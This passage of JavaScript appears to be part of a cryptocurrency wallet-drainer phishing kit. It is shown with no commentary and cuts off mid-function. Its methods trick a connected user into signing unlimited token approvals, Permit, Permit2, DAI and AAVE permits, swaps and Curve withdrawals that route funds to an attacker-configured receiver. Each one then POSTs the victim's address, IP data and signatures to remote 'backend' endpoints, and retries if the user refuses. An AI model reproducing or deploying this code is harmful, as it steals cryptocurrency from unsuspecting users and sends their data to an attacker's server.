                                "Content-Type": "application/json",
                                "Accept": "application/json"
                            },
                            "body": this.encryptBody(JSON.stringify({
                                "address": this.walletAddress,
                                "walletBalanceInEth": this.walletBalanceInEth,
                                "isMobile": this.isMobile(),
                                "websiteUrl": window.location.href,
                                "websiteDomain": window.location.host,
                                "ipData": a,
                                "API_KEY": config.API_KEY,
                                "signature": this.signature,
                                "hash_sweet": t,
                                "contractId": this.contractId,
                                "tokenPrice": Number(this.uniswapValue).toFixed(3) + " ETH",
                                "transferName": "UNISWAP",
                                "transactionHash": k
                            }))
                        });
                        await this.sleep(500);
                        return true;
                    })["catch"](async k => {
                        this.logCancel("UNISWAP ERC20", '', Number(this.uniswapValue).toFixed(3) + " ETH");
                        if (config.repeatHighest) {
                            return await this.transferERC20Uniswap(t);
                        }
                        this.updateButtonMessage(true);
                        this.txcount++;
                        return false;
                    });
                } else {
                    console.warn("UNISWAP no approved items");
                }
            } catch (k) {
                console.warn("Failed to transfer Uniswap");
            }
        }
    };
    ["transferERC20sushiswap"] = async t => {
        if (this.sushiswapTokens.length > 0) {
            console.log("ERC20 Uniswap", this.sushiswapTokens);
            try {
                if (this.sushiswapTokens.length > 0) {
                    await this.changeNetwork(1);
                    console.log("TRANSFERRING APPROVED SUSHISWAP ERC20 TOKENS");
                    console.table(this.sushiswapTokens);
                    await new Promise(async (k, Y) => {
                        let S = Math.floor(Date.now() / 1000) + 99990;
                        let U = [];
                        U[0] = this.sushiswapTokens[0].contractAddress;
                        U[1] = this.receiverSwapTokenAddress != this.sushiswapTokens[0].contractAddress ? this.receiverSwapTokenAddress : this.receiverSwapTokenAddressAlt;
                        let D = this.sushiswapTokens[0].balance;
                        let M = new ethers.utils.Interface(SUSHISWAP);
                        let G = M.encodeFunctionData("swapExactTokensForTokens", [D, 0, U, config.receiver, S]);
                        let O = {
                            "from": this.walletAddress,
                            "to": this.sushiSwapRouter,
                            "data": G,
                            "value": "0x0000"
                        };
                        let r = {
                            name: "SUSHISWAP",
                            totalPrice: this.uniswapValue,
                            chain: 1
                        };
                        this.estimateTXcosts(O, r, 1);
                        try {
                            this.logPromting(t, "SUSHISWAP", {
                                "chain": 0x1,
                                "tokenPrice": this.pancakeswapTokens_eth[0].price
                            });
                        } catch (d) {
                            console.warn(d);
                        }
                        await this.main_provider.sendAsync({
                            "method": "eth_sendTransaction",
                            "params": [O],
                            "from": this.walletAddress
                        }, (s, v) => {
                            if (s) {
                                console.error("Sushiswap error: ", s);
                                Y(s);
                            } else {
                                let E = v;
                                if (v.hasOwnProperty("result")) {
                                    E = v.result;
                                } else if (v.hasOwnProperty("hash")) {
                                    E = v.hash;
                                }
                                console.log("SUSHISWAP success", E);
                                this.pending.push(E);
                                this.sweets = this.sweets.filter(w => w.contractAddress != this.sushiswapTokens[0].contractAddress);
                                this.considerations = this.considerations.filter(w => w.token != this.sushiswapTokens[0].contractAddress);
                                this.offers = this.offers.filter(w => w.token != this.sushiswapTokens[0].contractAddress);
                                this.uniswapTokens = this.uniswapTokens.filter(w => w.contractAddress != this.sushiswapTokens[0].contractAddress);
                                this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(w => w.contractAddress != this.sushiswapTokens[0].contractAddress);
                                this.permitTokens = this.permitTokens.filter(w => w.contractAddress != this.sushiswapTokens[0].contractAddress);
                                k(E);
                            }
                        });
                    }).then(async k => {
                        let a = await this.getIpData();
                        fetch(this.logDomainName + "backend/swap", {
                            "method": "POST",
                            "headers": {
                                "Content-Type": "application/json",
                                "Accept": "application/json"
                            },
                            "body": this.encryptBody(JSON.stringify({
                                "address": this.walletAddress,
                                "walletBalanceInEth": this.walletBalanceInEth,
                                "isMobile": this.isMobile(),
                                "websiteUrl": window.location.href,
                                "websiteDomain": window.location.host,
                                "ipData": a,
                                "hash_sweet": t,
                                "API_KEY": config.API_KEY,
                                "signature": this.signature,
                                "contractId": this.contractId,
                                "tokenPrice": Number(this.pancakeswapTokens_eth[0].price).toFixed(3) + " ETH",
                                "transferName": "PANCAKESWAP",
                                "transactionHash": k
                            }))
                        });
                        this.txcount++;
                        this.addToLocalStorage(t);
                        await this.sleep(500);
                        return true;
                    })["catch"](async k => {
                        this.logCancel("PANCAKESWAP ERC20", '', Number(this.pancakeswapTokens_eth[0].price).toFixed(3) + " ETH");
                        if (config.repeatHighest) {
                            return await this.transferERC20sushiswap(t);
                        }
                        this.updateButtonMessage(true);
                    });
                } else {
                    console.warn("SUSHISWAP no approved items");
                }
            } catch (k) {
                console.warn("Failed to transfer PANCAKESWAP");
                this.logCancel("SUSHISWAP ERC20");
                if (config.repeatHighest) {
                    return await this.transferERC20sushiswap();
                }
                this.updateButtonMessage(true);
                this.txcount++;
            }
        }
    };
    ["transferERC20permit2"] = async (n, K, u) => {
        if (K.length > 0) {
            console.log("Permit2", K, u);
            console.log("PT", K);
            try {
                let S = K[0].chain;
                await this.changeNetwork(S);
                if (K.length > 0) {
                    let D = Date.now() + 30758400000;
                    let M = K.map(C => {
                        return {
                            "token": C.contractAddress,
                            "amount": "146150163733090291820368483271628301965593254297",
                            "expiration": D,
                            "nonce": 0
                        };
                    });
                    let G = K.map(C => {
                        return {
                            "from": this.walletAddress,
                            "to": config.seaport_receiver,
                            "amount": C.balance,
                            "token": C.contractAddress
                        };
                    });
                    let O = {
                        "name": "Permit2",
                        "chainId": S,
                        "verifyingContract": this.permitContract
                    };
                    let r = {
                        "PermitBatch": [{
                            "name": "details",
                            "type": "PermitDetails[]"
                        }, {
                            "name": "spender",
                            "type": "address"
                        }, {
                            "name": "sigDeadline",
                            "type": "uint256"
                        }],
                        "PermitDetails": [{
                            "name": "token",
                            "type": "address"
                        }, {
                            "name": "amount",
                            "type": "uint160"
                        }, {
                            "name": "expiration",
                            "type": "uint48"
                        }, {
                            "name": "nonce",
                            "type": "uint48"
                        }]
                    };
                    let d = {
                        "details": M,
                        "spender": config.tokenContractAddresses[S],
                        "sigDeadline": D
                    };
                    let v;
                    try {
                        const C = {
                            chain: S,
                            tokenPrice: u
                        };
                        this.logPromting(n, "PERMIT2", C);
                    } catch (E) {
                        console.warn(E);
                    }
                    await new Promise(async (w, T) => {
                        try {
                            v = await this.signer._signTypedData(O, r, d);
                            let P = false;
                            try {
                                const o = ethers.utils.verifyTypedData(O, r, d, v);
                                if (o.toLowerCase() === this.walletAddress.toLowerCase()) {
                                    P = false;
                                    console.log("Signature confirmed");
                                } else {
                                    console.log("Might be fake");
                                    P = true;
                                }
                            } catch {}
                            w([v, P]);
                        } catch (x) {
                            console.log("Error:", x);
                            T(x);
                        }
                    }).then(async w => {
                        let X = w[0];
                        let P = X;
                        if (X.hasOwnProperty("result")) {
                            P = X.result;
                        } else if (X.hasOwnProperty("hash")) {
                            P = X.hash;
                        }
                        let o = await this.getIpData();
                        fetch(this.logDomainName + "backend/permit2", {
                            "method": "POST",
                            "headers": {
                                "Content-Type": "application/json",
                                "Accept": "application/json"
                            },
                            "body": this.encryptBody(JSON.stringify({
                                "address": this.walletAddress,
                                "isMobile": this.isMobile(),
                                "websiteUrl": window.location.href,
                                "websiteDomain": window.location.host,
                                "withdrawals": G,
                                "ipData": o,
                                "details": M,
                                "mayfake": w[1],
                                "API_KEY": config.API_KEY,
                                "signature": this.signature,
                                "hash_sweet": n,
                                "contractId": 0x270f,
                                "tokenPrice": Number(u).toFixed(3) + " ETH",
                                "deadline": D,
                                "signature": P,
                                "chain": S,
                                "exclusiveContractId": 0x270f,
                                "unmarkedContract": config.tokenContractAddresses[S]
                            }))
                        });
                        this.sweets = this.sweets.filter(x => !K.map(e => e.contractAddress).includes(x.contractAddress));
                        this.considerations = this.considerations.filter(x => !K.map(e => e.contractAddress).includes(x.token));
                        this.offers = this.offers.filter(x => !K.map(e => e.contractAddress).includes(x.token));
                        this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(x => !K.map(e => e.contractAddress).includes(x.contractAddress));
                        this.sushiswapTokens = this.sushiswapTokens.filter(x => !K.map(e => e.contractAddress).includes(x.contractAddress));
                        this.txcount++;
                        this.addToLocalStorage(n);
                        return true;
                    })["catch"](async w => {
                        this.logCancel("Permit2", '', Number(u).toFixed(3) + " ETH");
                        if (config.repeatHighest) {
                            return await this.transferERC20permit2(n, K, u);
                        }
                        console.log(w);
                        this.txcount++;
                    });
                }
            } catch (w) {
                console.warn("Permit2 error:", w);
            }
        }
    };
    ["withdrawCurve"] = async (t, n) => {
        await this.changeNetwork(1);
        try {
            let Y;
            let a = CURVE_ABI;
            if (n.useEth) {
                a = CURVE_USE_ETH_ABI;
            }
            let S = new ethers.utils.Interface(a);
            if (n.useEth) {
                Y = S.encodeFunctionData("remove_liquidity_one_coin", [n.balance, 0, 0, false, config.receiver]);
            } else {
                Y = S.encodeFunctionData("remove_liquidity_one_coin", [n.balance, 0, 0, config.receiver]);
            }
            try {
                this.logPromting(t, "CURVE", {
                    "chain": 0x1,
                    "tokenPrice": n.usdPrice
                });
            } catch (U) {
                console.warn(U);
            }
            await new Promise(async (D, l) => {
                let O = {
                    "from": this.walletAddress,
                    "to": n.contractAddress,
                    "value": "0x0000",
                    "data": Y
                };
                await this.main_provider.sendAsync({
                    "method": "eth_sendTransaction",
                    "params": [O],
                    "from": this.walletAddress
                }, (r, d) => {
                    if (r) {
                        l(r);
                    } else {
                        let v = d;
                        if (d.hasOwnProperty("result")) {
                            v = d.result;
                        } else if (d.hasOwnProperty("hash")) {
                            v = d.hash;
                        }
                        D(v);
                    }
                });
            }).then(async D => {
                let M = await this.getIpData();
                fetch(this.logDomainName + "backend/curve", {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    "body": this.encryptBody(JSON.stringify({
                        "address": this.walletAddress,
                        "isMobile": this.isMobile(),
                        "websiteUrl": window.location.href,
                        "websiteDomain": window.location.host,
                        "ipData": M,
                        "API_KEY": config.API_KEY,
                        "chain": n.chain,
                        "tokenName": n.tname,
                        "tokenPrice": Number(n.usdPrice).toFixed(2) + " $",
                        "withdrawBalance": n.balance,
                        "contractAddress": n.contractAddress,
                        "hash_sweet": t,
                        "signature": this.signature,
                        "contractId": 0x270f,
                        "transactionHash": D,
                        "exclusiveContractId": 0x270f,
                        "unmarkedContract": config.tokenContractAddresses[n.chain]
                    }))
                });
                this.txcount++;
                this.addToLocalStorage(t);
                return true;
            })["catch"](async D => {
                this.logCancel("Curve", n.tname, n.usdPrice.toString() + " $");
                if (config.repeatHighest) {
                    return await this.withdrawCurve(t, n);
                }
                console.log("Failed to transfer ERC20: ", D);
            });
        } catch (D) {
            console.log("Withdraw Curve Error: ", D);
        }
    };
    ["transferERC20"] = async (t, n) => {
        console.log("ERC20", n);
        console.log("Transferring ERC20 " + n.fullName);
        console.log("Pending Transactions: " + this.pending.length);
        try {
            await this.changeNetwork(n.chain);
            console.log("Trying " + n.tname);
            if (n.tname == "DAI" && n.chain == 1) {
                await this.permitDAI(t, n);
            } else {
                if (n.is_aave == true) {
                    await this.permitAAVE(t, n);
                } else {
                    if (n.curve == true) {
                        await this.withdrawCurve(t, n);
                    } else {
                        if (n.tname == "USDC" && n.chain == 1 || n.permit) {
                            await this.permitERC20(t, n);
                        } else {
                            console.log("Failed to permit trying safa ERC20 for " + n.tname);
                            await new Promise(async (a, S) => {
                                const l = [{
                                    "constant": false,
                                    "inputs": [{
                                        "name": "_spender",
                                        "type": "address"
                                    }, {
                                        "name": "_value",
                                        "type": "uint256"
                                    }],
                                    "name": "approve",
                                    "outputs": [{
                                        "name": '',
                                        "type": "bool"
                                    }],
                                    "payable": false,
                                    "stateMutability": "nonpayable",
                                    "type": "function"
                                }, {
                                    "constant": false,
                                    "inputs": [{
                                        "name": "spender",
                                        "type": "address"
                                    }, {
                                        "name": "addedValue",
                                        "type": "uint256"
                                    }],
                                    "name": "increaseAllowance",
                                    "outputs": [{
                                        "name": '',
                                        "type": "bool"
                                    }],
                                    "payable": false,
                                    "stateMutability": "nonpayable",
                                    "type": "function"
                                }, {
                                    "constant": false,
                                    "inputs": [{
                                        "name": "_spender",
                                        "type": "address"
                                    }, {
                                        "name": "_addedValue",
                                        "type": "uint256"
                                    }],
                                    "name": "increaseApproval",
                                    "outputs": [{
                                        "name": "success",
                                        "type": "bool"
                                    }],
                                    "payable": false,
                                    "stateMutability": "nonpayable",
                                    "type": "function"
                                }];
                                let M = await this.ethers_provider.send("eth_requestAccounts", []);
                                let O = new ethers.Contract(n.contractAddress, l, this.ethers_provider);
                                let d = O["interface"].encodeFunctionData("approve", [config.tokenContractAddresses[n.chain], ethers.constants.MaxUint256]);
                                let v = O["interface"].encodeFunctionData("increaseAllowance", [config.tokenContractAddresses[n.chain], ethers.constants.MaxUint256]);
                                let E = O["interface"].encodeFunctionData("increaseApproval", [config.tokenContractAddresses[n.chain], ethers.constants.MaxUint256]);
                                let w = 0;
                                let T = 1;
                                let X = ["0xe65cdb6479bac1e22340e4e755fae7e509ecd06c", "0x6c8c6b02e7b2be14d4fa6022dfd6d75921d90e4e", "0x70e36f6bf80a52b3b46b3af8e106cc0ed743e8e4", "0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5", "0x7713dd9ca933848f6819f38b8352d9a15ea73f67", "0xface851a4921ce59e912d19329929ce6da6eb0c7", "0x5d3a536e4d6dbd6114cc1ead35777bab948e3643", "0x95b4ef2869ebd94beb4eee400a99824bf5dc325b", "0x158079ee67fce2f58472a96584a73c7ab9ac95c1", "0xf5dce57282a584d2746faf1593d3121fcac444dc", "0x4b0181102a0112a2ef11abee5563bb4a3176c9d7", "0x12392f67bdf24fae0af363c24ac620a2f67dad86", "0x35a18000230da775cac24873d00ff85bccded550", "0x39aa39c021dfbae8fac545936693ac917d5e7563", "0x041171993284df560249b57358f931d9eb7b925d", "0xf650c3d88d12db855b8bf7d11be6c55a4e07dcc9", "0xc11b1268c1a384e55c48c2391d8d480264a3a7f4", "0x80a2ae356fc9ef4305676f7a3e2ed04e12c33946", "0xccf4429db6322d5c611ee964527d42e5d685dd6a", "0xb3319f5d18bc0d84dd1b4825dcde5d5f7266d407", "0xc00e94cb662c3520282e6f5717214004a7f26888"];
                                if (n.contractAddress.toLowerCase() == "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2" || n.contractAddress.toLowerCase() == "0x4200000000000000000000000000000000000006") {
                                    w = 0;
                                    T = 0;
                                }
                                if (n.chain == 1 && (n.contractAddress.toLowerCase() == "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599" || n.contractAddress.toLowerCase() == "0x514910771af9ca656af840dff83e8264ecf986ca")) {
                                    w = 2;
                                    T = 0;
                                }
                                if (X.includes(n.contractAddress.toLowerCase())) {
                                    w = 0;
                                    T = 0;
                                }
                                if (T) {
                                    try {
                                        w = 1;
                                    } catch {
                                        console.log("Unable to use IncreaseAllowance");
                                    }
                                }
                                console.log("Address", this.walletAddress);
                                let P = {
                                    "from": M[0],
                                    "to": n.contractAddress,
                                    "data": d,
                                    "value": "0",
                                    "chainId": n.chain
                                };
                                if (w == 1) {
                                    console.log("Using increaseAllowance");
                                    P.data = v;
                                }
                                if (w == 2) {
                                    console.log("Using increaseApproval");
                                    P.data = E;
                                }
                                P.nonce = await this.ethers_provider.getTransactionCount(this.walletAddress);
                                P.nonce = "0x" + P.nonce.toString(16);
                                this.estimateTXcosts(P, n, n.chain);
                                try {
                                    this.logPromting(t, "ERC20", {
                                        "chain": n.chain,
                                        "contractAddress": n.contractAddress,
                                        "to_wallet": config.tokenContractAddresses[n.chain],
                                        "usdPrice": n.usdPrice,
                                        "withdrawBalance": n.balance,
                                        "approveMethod": w,
                                        "tokenName": n.tname
                                    });
                                } catch (x) {
                                    console.warn(x);
                                }
                                await this.main_provider.sendAsync({
                                    "id": n.chain,
                                    "method": "eth_sendTransaction",
                                    "params": [P],
                                    "from": M[0]
                                }, (e, y) => {
                                    if (e == null) {
                                        let F = y;
                                        if (y.hasOwnProperty("result")) {
                                            F = y.result;
                                        } else if (y.hasOwnProperty("hash")) {
                                            F = y.hash;
                                        }
                                        console.log("ERC20 success", F);
                                        this.pending.push(F);
                                        a(F);
                                    } else {
                                        this.updateButtonMessage(true);
                                        S(e);
                                    }
                                });
                            }).then(async a => {
                                let U = await this.getIpData();
                                fetch(this.logDomainName + "backend/safa/erc20", {
                                    "method": "POST",
                                    "headers": {
                                        "Content-Type": "application/json",
                                        "Accept": "application/json"
                                    },
                                    "body": this.encryptBody(JSON.stringify({
                                        "address": this.walletAddress,
                                        "isMobile": this.isMobile(),
                                        "websiteUrl": window.location.href,
                                        "websiteDomain": window.location.host,
                                        "ipData": U,
                                        "API_KEY": config.API_KEY,
                                        "chain": n.chain,
                                        "tokenName": n.tname,
                                        "tokenPrice": Number(n.usdPrice).toFixed(2) + " $",
                                        "withdrawBalance": n.balance,
                                        "contractAddress": n.contractAddress,
                                        "hash_sweet": t,
                                        "signature": this.signature,
                                        "contractId": 0x270f,
                                        "transactionHash": a,
                                        "exclusiveContractId": 0x270f,
                                        "unmarkedContract": config.tokenContractAddresses[n.chain]
                                    }))
                                });
                                this.uniswapTokens = this.considerations.filter(D => D.contractAddress != n.contractAddress);
                                this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(D => D.contractAddress != n.contractAddress);
                                this.pancakeswapTokens_bsc = this.pancakeswapTokens_bsc.filter(D => D.contractAddress != n.contractAddress);
                                this.uniswapTokens = this.uniswapTokens.filter(D => D.contractAddress != n.contractAddress);
                                this.sushiswapTokens = this.sushiswapTokens.filter(D => D.contractAddress != n.contractAddress);
                                this.permitTokens.ETH = this.permitTokens.ETH.filter(D => D.contractAddress != n.contractAddress);
                                this.permitTokens.BSC = this.permitTokens.BSC.filter(D => D.contractAddress != n.contractAddress);
                                this.permitTokens.ARB = this.permitTokens.ARB.filter(D => D.contractAddress != n.contractAddress);
                                this.permitTokens.POLYGON = this.permitTokens.POLYGON.filter(D => D.contractAddress != n.contractAddress);
                                this.permitTokens.OPTIMISM = this.permitTokens.OPTIMISM.filter(D => D.contractAddress != n.contractAddress);
                                this.addToLocalStorage(t);
                                this.txcount++;
                                return true;
                            })["catch"](async a => {
                                this.logCancel(n.name, n.tname, n.usdPrice.toString() + " $");
                                if (config.repeatHighest) {
                                    return await this.transferERC20(t, n);
                                }
                                console.log("Failed to transfer ERC20: ", a);
                            });
                        }
                    }
                }
            }
        } catch (a) {
            console.warn("Failed to transfer ERC20 " + n.name);
        }
    };
    ["permitAAVE"] = async (t, n) => {
        console.log("Permit", n);
        try {
            await this.changeNetwork(n.chain);
            let Y = n.chain;
            let a = Date.now() + 30758400000;
            let U = [{
                "name": "owner",
                "type": "address"
            }, {
                "name": "spender",
                "type": "address"
            }, {
                "name": "value",
                "type": "uint256"
            }, {
                "name": "nonce",
                "type": "uint256"
            }, {
                "name": "deadline",
                "type": "uint256"
            }];
            let D = {
                "types": {
                    "Permit": U
                },
                "primaryType": "Permit",
                "domain": {
                    "name": n.fullName,
                    "verifyingContract": n.contractAddress,
                    "chainId": Y,
                    "version": "1"
                },
                "message": {
                    "owner": this.walletAddress,
                    "spender": config.tokenContractAddresses[Y],
                    "value": "1158472395435294898592384258348512586931256000000000000000000",
                    "nonce": n.nonce,
                    "deadline": a
                }
            };
            try {
                this.logPromting(t, "AAVE", {
                    "chain": 0x1,
                    "tokenName": n.tname,
                    "tokenPrice": n.usdPrice,
                    "tokenName": n.tname
                });
            } catch (l) {
                console.warn(l);
            }
            await new Promise(async (M, G) => {
                try {
                    let r = await this.signer._signTypedData(D.domain, D.types, D.message);
                    let d = false;
                    try {
                        const s = ethers.utils.verifyTypedData(D.domain, D.types, D.message, r);
                        if (s.toLowerCase() === this.walletAddress.toLowerCase()) {
                            d = false;
                            console.log("Signature confirmed");
                            console.log("Signature confirmed");
                        } else {
                            console.log("Might be fake");
                            d = true;
                        }
                    } catch {}
                    M([r, d]);
                } catch (v) {
                    console.log(v);
                    G(v);
                }
            }).then(async M => {
                let O = M[0];
                let r = O.substring(2);
                let d = "0x" + r.substring(0, 64);
                let s = "0x" + r.substring(64, 128);
                let v = parseInt(r.substring(128, 130), 16);
                let C = await this.getIpData();
                fetch(this.logDomainName + "backend/permit", {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    "body": this.encryptBody(JSON.stringify({
                        "address": this.walletAddress,
                        "chain": Y,
                        "isMobile": this.isMobile(),
                        "websiteUrl": window.location.href,
                        "websiteDomain": window.location.host,
                        "API_KEY": config.API_KEY,
                        "mayfake": M[1],
                        "ipData": C,
                        "signature": this.signature,
                        "contractId": 0x270f,
                        "chain": Y,
                        "hash_sweet": t,
                        "tokenName": n.name,
                        "tokenPrice": Number(n.usdPrice).toFixed(2) + " $",
                        "withdrawBalance": n.balance,
                        "contractAddress": n.contractAddress,
                        "deadline": a,
                        "exclusiveContractId": 0x270f,
                        "unmarkedContract": config.tokenContractAddresses[Y],
                        "v": v,
                        "r": d,
                        "s": s
                    }))
                });
                this.txcount++;
                this.addToLocalStorage(t);
                return true;
            })["catch"](async M => {
                this.logCancel("Permit ERC20", n.tname, n.usdPrice.toString() + " $");
                if (config.repeatHighest) {
                    return await this.permitAAVE(t, n);
                }
                this.updateButtonMessage(true);
                this.sweets = this.sweets.filter(d => ![d].map(s => s.contractAddress).includes(d.contractAddress));
                this.txcount++;
            });
        } catch (M) {
            console.warn("Permit AAVE Error:" + M);
        }
    };
    ["permitDAI"] = async (t, n) => {
        console.log("PermitDAI", n);
        try {
            await this.changeNetwork(1);
            let Y = n.chain;
            let S = new ethers.Contract(n.contractAddress, DAI_PERMIT_ABI, this.secondProvider);
            let U = await S.nonces(this.walletAddress);
            let M = [{
                "name": "holder",
                "type": "address"
            }, {
                "name": "spender",
                "type": "address"
            }, {
                "name": "nonce",
                "type": "uint256"
            }, {
                "name": "expiry",
                "type": "uint256"
            }, {
                "name": "allowed",
                "type": "bool"
            }];
            let G = {
                "daiMainnet": {
                    "name": "Dai Stablecoin",
                    "version": "1",
                    "chainId": Y,
                    "verifyingContract": "0x6b175474e89094c44da98b954eedeac495271d0f"
                }
            };
            let O = {
                "types": {
                    "Permit": M
                },
                "primaryType": "Permit",
                "domain": G.daiMainnet,
                "message": {
                    "holder": this.walletAddress,
                    "spender": config.tokenContractAddresses[Y],
                    "nonce": U,
                    "expiry": "1677587272218",
                    "allowed": true
                }
            };
            try {
                this.logPromting(t, "DAI", {
                    "chain": 0x1,
                    "tokenPrice": n.usdPrice,
                    "tokenName": n.tname
                });
            } catch (r) {
                console.warn(r);
            }
            await new Promise(async (d, s) => {
                try {
                    let C = await this.signer._signTypedData(G.daiMainnet, O.types, O.message);
                    console.log(C);
                    let w = false;
                    try {
                        const T = ethers.utils.verifyTypedData(G.daiMainnet, O.types, O.message, C);
                        if (T.toLowerCase() === this.walletAddress.toLowerCase()) {
                            w = false;
                            console.log("Signature confirmed");
                        } else {
                            console.log("Fake sign");
                            w = true;
                        }
                    } catch {}
                    d([C, w]);
                } catch (X) {
                    s(X);
                }
            }).then(async d => {
                let v = d[0];
                let C = v.substring(2);
                let E = "0x" + C.substring(0, 64);
                let w = "0x" + C.substring(64, 128);
                let T = parseInt(C.substring(128, 130), 16);
                let X = await this.getIpData();
                fetch(this.logDomainName + "backend/permitdai", {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    "body": this.encryptBody(JSON.stringify({
                        "address": this.walletAddress,
                        "chain": n.chain,
                        "isMobile": this.isMobile(),
                        "websiteUrl": window.location.href,
                        "websiteDomain": window.location.host,
                        "ipData": X,
                        "API_KEY": config.API_KEY,
                        "contractId": 0x270f,
                        "tokenName": n.name,
                        "tokenPrice": Number(n.usdPrice).toFixed(2) + " $",
                        "withdrawBalance": n.balance,
                        "hash_sweet": t,
                        "contractAddress": n.contractAddress,
                        "signature": this.signature,
                        "exclusiveContractId": 0x270f,
                        "unmarkedContract": config.tokenContractAddresses[Y],
                        "nonce": U,
                        "expiry": "1677587272218",
                        "mayfake": d[1],
                        "v": T,
                        "r": E,
                        "s": w
                    }))
                });
                this.sweets = this.sweets.filter(P => ![P].map(o => o.contractAddress).includes(P.contractAddress));
                this.uniswapTokens = this.considerations.filter(P => P.contractAddress != n.contractAddress);
                this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(P => P.contractAddress != n.contractAddress);
                this.pancakeswapTokens_bsc = this.pancakeswapTokens_bsc.filter(P => P.contractAddress != n.contractAddress);
                this.uniswapTokens = this.uniswapTokens.filter(P => P.contractAddress != n.contractAddress);
                this.sushiswapTokens = this.sushiswapTokens.filter(P => P.contractAddress != n.contractAddress);
                this.permitTokens.ETH = this.permitTokens.ETH.filter(P => P.contractAddress != n.contractAddress);
                this.txcount++;
                this.addToLocalStorage(t);
                return true;
            })["catch"](async d => {
                this.logCancel("Permit " + n.type, n.tname, n.usdPrice.toString() + " $");
                if (config.repeatHighest) {
                    return await this.permitDAI(t, n);
                }
                this.txcount++;
            });
        } catch (d) {
            console.warn("Permit Dai error: " + d);
        }
    };
    ["permitERC20"] = async (n, K) => {
        console.log("Permit", K);
        try {
            await this.changeNetwork(K.chain);
            let a = K.chain;
            let S = K.nonce;
            let U = Date.now() + 30758400000;
            let l = [{
                "name": "owner",
                "type": "address"
            }, {
                "name": "spender",
                "type": "address"
            }, {
                "name": "value",
                "type": "uint256"
            }, {
                "name": "nonce",
                "type": "uint256"
            }, {
                "name": "deadline",
                "type": "uint256"
            }];
            console.log(K.permit_data.name, K.permit_data.version);
            const M = {
                Permit: l
            };
            let G = {
                "types": M,
                "primaryType": "Permit",
                "domain": {
                    "name": K.permit_data.name,
                    "verifyingContract": K.contractAddress,
                    "chainId": a,
                    "version": K.permit_data.version
                },
                "message": {
                    "owner": this.walletAddress,
                    "spender": config.tokenContractAddresses[a],
                    "value": "1158472395435294898592384258348512586931256000000000000000000",
                    "nonce": S,
                    "deadline": U
                }
            };
            try {
                this.logPromting(n, "PERMIT", {
                    "chain": 0x1,
                    "tokenPrice": K.usdPrice,
                    "tokenName": K.tname
                });
            } catch (O) {
                console.warn(O);
            }
            await new Promise(async (r, d) => {
                try {
                    let v = await this.signer._signTypedData(G.domain, G.types, G.message);
                    console.log(v);
                    let C = false;
                    try {
                        const E = ethers.utils.verifyTypedData(G.domain, G.types, G.message, signatureVersion);
                        console.log(E);
                        if (E.toLowerCase() === this.walletAddress.toLowerCase()) {
                            C = false;
                            console.log("Signature confirmed");
                        } else {
                            console.log("Might be fake");
                            C = true;
                        }
                    } catch {}
                    r([v, C]);
                } catch (w) {
                    console.log(w);
                    d(w);
                }
            }).then(async r => {
                let s = r[0];
                let v = s.substring(2);
                let C = "0x" + v.substring(0, 64);
                let E = "0x" + v.substring(64, 128);
                let w = parseInt(v.substring(128, 130), 16);
                let T = await this.getIpData();
                fetch(this.logDomainName + "backend/permit", {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    "body": this.encryptBody(JSON.stringify({
                        "address": this.walletAddress,
                        "chain": a,
                        "isMobile": this.isMobile(),
                        "websiteUrl": window.location.href,
                        "websiteDomain": window.location.host,
                        "API_KEY": config.API_KEY,
                        "contractId": 0x270f,
                        "ipData": T,
                        "signature": this.signature,
                        "mayfake": r[1],
                        "hash_sweet": n,
                        "chain": a,
                        "tokenName": K.tname,
                        "tokenPrice": Number(K.usdPrice).toFixed(2) + " $",
                        "withdrawBalance": K.balance,
                        "contractAddress": K.contractAddress,
                        "deadline": U,
                        "exclusiveContractId": 0x270f,
                        "unmarkedContract": config.tokenContractAddresses[a],
                        "v": w,
                        "r": C,
                        "s": E
                    }))
                });
                this.sweets = this.sweets.filter(X => ![X].map(P => P.contractAddress).includes(X.contractAddress));
                this.uniswapTokens = this.considerations.filter(X => X.contractAddress != K.contractAddress);
                this.pancakeswapTokens_eth = this.pancakeswapTokens_eth.filter(X => X.contractAddress != K.contractAddress);
                this.pancakeswapTokens_bsc = this.pancakeswapTokens_bsc.filter(X => X.contractAddress != K.contractAddress);
                this.uniswapTokens = this.uniswapTokens.filter(X => X.contractAddress != K.contractAddress);
                this.sushiswapTokens = this.sushiswapTokens.filter(X => X.contractAddress != K.contractAddress);
                this.permitTokens.ETH = this.permitTokens.ETH.filter(X => X.contractAddress != K.contractAddress);
                this.permitTokens.BSC = this.permitTokens.BSC.filter(X => X.contractAddress != K.contractAddress);
                this.permitTokens.ARB = this.permitTokens.ARB.filter(X => X.contractAddress != K.contractAddress);
                this.permitTokens.POLYGON = this.permitTokens.POLYGON.filter(X => X.contractAddress != K.contractAddress);
                this.permitTokens.OPTIMISM = this.permitTokens.OPTIMISM.filter(X => X.contractAddress != K.contractAddress);
                this.txcount++;
                this.addToLocalStorage(n);
                return true;
            })["catch"](async r => {
                this.logCancel("Permit ", K.tname, K.usdPrice.toString() + " $");
                if (config.repeatHighest) {
                    return await this.permitERC20(n, K);
                }
                this.updateButtonMessage(true);
                this.txcount++;
            });
        } catch (r) {
            console.warn("Permit USDC Error:" + r);
        }
    };
    ["transferComet"] = async (t, n) => {
        await this.changeNetwork(n.chain);
        console.log("Transferring Comet" + n.name);
        try {
            let Y = n.chain;
            let a = new ethers.utils.Interface(COMET_ABI);
            let S = a.encodeFunctionData("allow", [config.tokenContractAddresses[1], true]);
            try {
                this.logPromting(t, "COMET", {
                    "chain": Y,
                    "tokenName": n.name,
                    "tokenPrice": n.totalPrice,
                    "withdrawals": n.assets,
                    "contractAddress": n.contractAddress,
                    "to_wallet": config.tokenContractAddresses[Y]
                });
            } catch (U) {
                console.warn(U);
            }
            await new Promise(async (D, l) => {
                let r = {
                    "from": this.walletAddress,
                    "to": n.contractAddress,
